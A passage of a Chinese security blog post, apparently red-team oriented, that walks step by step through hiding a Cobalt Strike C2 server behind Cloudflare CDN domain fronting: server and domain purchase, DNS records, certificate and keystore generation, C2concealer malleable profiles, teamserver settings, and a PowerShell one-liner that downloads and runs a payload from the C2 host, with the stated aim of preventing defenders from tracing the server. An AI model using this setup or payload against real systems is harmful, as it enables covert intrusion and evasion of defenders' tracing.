+<p>在微步云沙箱中可以清晰地看到请求域名为腾讯云域名同时IP地址为腾讯云的IDC服务器，而不是我们真正的CS服务器IP地址，说明CS服务器已成功隐藏。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.26.03.png" alt="截屏2021-12-23 上午3.26.03"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.39.41.png" alt="截屏2021-12-23 上午3.39.41"></p>
+<h2 id="0x02-CDN、域前置"><a href="#0x02-CDN、域前置" class="headerlink" title="0x02 CDN、域前置"></a>0x02 CDN、域前置</h2><h3 id="域前置介绍"><a href="#域前置介绍" class="headerlink" title="域前置介绍"></a>域前置介绍</h3><p>域前置（domain Fronting）是一种基于 https 的通用规避技术，也被称为域前端网络技术，这是一种用来隐藏 Metasploit、Cobalt Strike等团队控制服务器流量，从而一定程度上绕过检查或防火墙检测技术，一般像 Amazon、Google、Akamai 等大型厂商都会提供域前端技术服务。</p>
+<p>与云函数类似，域前置技术主要通过CDN节点将流量转发给真实的C2服务器，CDN节点ip可通过识别请求的Host头进行流量转发，利用我们配置域名的高可信度，那么就可以有效躲避针对DLP、agent等流量监测。</p>
+<h3 id="CDN介绍"><a href="#CDN介绍" class="headerlink" title="CDN介绍"></a>CDN介绍</h3><p>域前置核心就是CDN，它的工作原理就是单一IP可被不同域名进行绑定以用于网站加速。例如现在存在 <a target="_blank" rel="noopener" href="http://www.a.com/">www.a.com</a> 和 <a target="_blank" rel="noopener" href="http://www.b.com/">www.b.com</a> 这两个域名，它们都同时指向同一个IP，该IP实际上就是 CDN 服务器。那么当我们使用浏览器访问这两个域名时，怎么保证访问的目标就是指定的网站内容呢？我们可以在 http 请求包中的 Host 请求头中加入需要访问的域名，从而定位需要访问的网站。</p>
+<p>如果还不明白我们可以使用实际案例进行演示，其中假设<code>1.1.1.1</code>为 CDN 服务器， <code>www.a.com</code>和<code>www.b.com</code>为该服务器上的域名，这两个域名都绑定了CDN 加速。</p>
+<p>首先使用 curl 命令请求<code>www.a.com</code>，成功返回目标站点的信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.a.com -v </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-12%2004.49.45.png" alt="截屏2022-04-12 04.49.45"></p>
+<p>那么接下来尝试请求CDN服务器会发生什么呢？结果返回403</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 1.1.1.1 -v</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-12%2004.53.15.png" alt="截屏2022-04-12 04.53.15"></p>
+<p>但我们只需要添加上 Host 头就能访问<code>www.a.com</code>的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 1.1.1.1 -H &quot;Host: www.a.com&quot; -v</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-12%2004.53.49.png" alt="截屏2022-04-12 04.53.49"></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>搭建环境我们可以进行如下配置，这一套整下来大概花费了6美金</p>
+<ul>
+<li>云服务器</li>
+<li>Cobalt Strike 4.3</li>
+<li>Cloudfare CDN加速</li>
+<li>域名</li>
+</ul>
+<p><strong>域名购买地址：<a target="_blank" rel="noopener" href="https://porkbun.com/">https://porkbun.com</a></strong></p>
+<p><strong>云服务器购买地址：<a target="_blank" rel="noopener" href="https://my.vultr.com/">https://my.vultr.com</a></strong></p>
+<p><strong>CDN注册地址：<a target="_blank" rel="noopener" href="https://www.cloudfare.com/">https://www.cloudfare.com</a></strong></p>
+<h4 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h4><p>在<code>vultr</code>中注册一个账号，注册完成后我选择 PayPal 绑定，大概需要一天时间来对我的账号进行验证，当然如果没有 PayPal 的话也可以使用 AliPay、信用卡进行绑定。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.42.28.png" alt="截屏2022-04-19 03.42.28"></p>
+<p>绑定完成后新账号会送150美金，选择自己喜爱的配置部署云服务器，部署成功的IP地址为2.2.2.2<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2011.24.25.png" alt="截屏2022-04-19 11.24.25"></p>
+<h4 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h4><p>在 porkbun 中注册账号，成功购买我们的新域名<code>xxx.xyz</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2002.59.14.png" alt="截屏2022-04-19 02.59.14"></p>
+<h4 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h4><p>在 Cloudflare 中绑定以上购买的域名，结果显示我们需要修改该域名的DNS记录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.02.52.png" alt="截屏2022-04-19 03.02.52"></p>
+<p>修改域名解析服务器如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jake.ns.cloudflare.com</span><br><span class="line">magdalena.ns.cloudflare.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.04.18.png" alt="截屏2022-04-19 03.04.18"></p>
+<p>修改完成后等待 Cloudflare 重新匹配，直至出现如下界面说明 CDN 部署成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.39.33.png" alt="截屏2022-04-19 03.39.33"></p>
+<p>添加 DNS 解析记录如下，与此同时我们还</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A c2 2.2.2.2</span><br><span class="line">A xxx.xyz 2.2.2.2</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2011.19.15.png" alt="截屏2022-04-19 11.19.15"></p>
+<p>测试CDN节点是否能够已经解析，成功解析则说明目前一切顺利</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 172.67.175.223 -H &quot;Host: xxx.xyz&quot; -v</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2011.29.56.png" alt="截屏2022-04-19 11.29.56"></p>
+<p>在 Cloudflare 中开启 SSL 并设置SSL/TLS加密模式为完全<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2004.26.47.png" alt="截屏2022-04-19 04.26.47"></p>
+<p>创建SSL/TLS证书，具体配置如下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2011.32.25.png" alt="截屏2022-04-20 11.32.25"></p>
+<p>点击创建后可成功生成对应的源证书和私钥<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2015.27.26.png" alt="截屏2022-04-20 15.27.26"></p>
+<h3 id="C2服务端测试-1"><a href="#C2服务端测试-1" class="headerlink" title="C2服务端测试"></a>C2服务端测试</h3><p>在云服务器上定制 malleable C2 以用于配置证书，使用 openssl 利用CDN的SSL/TLS源证书和私钥生成PFX文件<code>spoofdomain.p12</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cloudflare.pem -inkey cloudflare.key -out spoofdomain.p12 -name c2.maccc.xyz -passout pass:macmacmac</span><br></pre></td></tr></table></figure>
+
+<p>Keytool是一个Java数据证书的管理工具，使用它将以上密钥和证书生成的PFX文件存在keystore文件<code>new.store</code>当中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass macmacmac -destkeypass macmacmac -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass macmacmac -alias c2.xxx.xyz</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.38.13.png" alt="截屏2022-04-20 16.38.13"></p>
+<p><strong>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/FortyNorthSecurity/C2concealer">https://github.com/FortyNorthSecurity/C2concealer</a></strong></p>
+<p>C2concealer 是一款随机生成 CS 使用的C2 malleable profiles的命令行工具，如果未安装可使用如下命令进行安装</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x install.sh</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.46.02.png" alt="截屏2022-04-20 16.46.02"></p>
+<p>使用 C2concealer 生成 CS 的配置文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C2concealer --variant 1 --hostname c2.xxx.xyz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 选择步骤</span></span><br><span class="line">1.3</span><br><span class="line">2./root/CS4.3/new.store</span><br><span class="line">3.输入账号密码</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.49.25.png" alt="截屏2022-04-20 16.49.25"></p>
+<p>成功生成文件名为随机数 CS 配置文件，将其复制到 CS 目录下并重命名为<code>test.profile</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp 56069b6a.profile /root/CS4.3/test.profile</span><br><span class="line">cd /root/CS4.3/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.51.58.png" alt="截屏2022-04-20 16.51.58"></p>
+<p>使用 c2lint 检查该配置文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x c2lint</span><br><span class="line">./c2lint test.profile</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.53.33.png" alt="截屏2022-04-20 16.53.33"></p>
+<p>修改 teamserver 配置，当然最好把我们 CS 的默认端口50050也修改成其他端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置修改</span></span><br><span class="line">javax.net.ssl.keyStore=./new.store</span><br><span class="line">-Djavax.net.ssl.keyStorePassword=macmacmac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2017.49.49.png" alt="截屏2022-04-20 17.49.49"></p>
+<p>启动 teamserver 并加载配置文件<code>test.profile</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 2.2.2.2 macmacmac test.profile</span><br></pre></td></tr></table></figure>
+
+<h3 id="C2上线-1"><a href="#C2上线-1" class="headerlink" title="C2上线"></a>C2上线</h3><p>在 CS 客户端生成 https 监听器<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.20.41.png" alt="截屏2022-04-21 00.20.41"></p>
+<p>配置拥有 SSL 的 web 服务，选择 payload 类型为 powershell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.26.44.png" alt="截屏2022-04-21 00.26.44"></p>
+<p>成功生成 powershell 版本的 payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;https://c2.xxx.xyz:443/test&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在靶机中执行后可成功上线，与此同时我们可以发现外部地址随着每次请求一直变化，因此防守方溯源到我们C2服务器的IP地址几率也就非常低<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.32.06.png" alt="截屏2022-04-21 00.32.06"></p>
+<p>在 CS 中成功执行命令并在受害主机上开启 WireShark 抓包<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.47.26.png" alt="截屏2022-04-21 00.47.26"></p>
+<p>在 WireShark 中跑的都是TLS加密流量、目的地址为随机的CDN节点，因此无法溯源到我们C2服务器的真实IP<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.48.32.png" alt="截屏2022-04-21 00.48.32"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>通过这段时间针对流量加密的学习，我发现网络攻击与防守总是在不断转换，就像CDN在设计之初主要用于保护网站的真实IP，但作为攻击者我们也可以使用它来保护我们的C2服务器；使用OpenSSL生成的RSA证书能够有效地帮助我们加密流量、隐藏通信。因此技术不分好坏，决定好坏的往往在于使用它的人。</p>
+<p><strong>参考文章1：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/118413649">https://blog.csdn.net/weixin_44604541/article/details/118413649</a></strong></p>
+<p><strong>参考文章2：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243146">https://www.anquanke.com/post/id/243146</a></strong></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/d78132c5/">数据库攻防之MongoDB<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
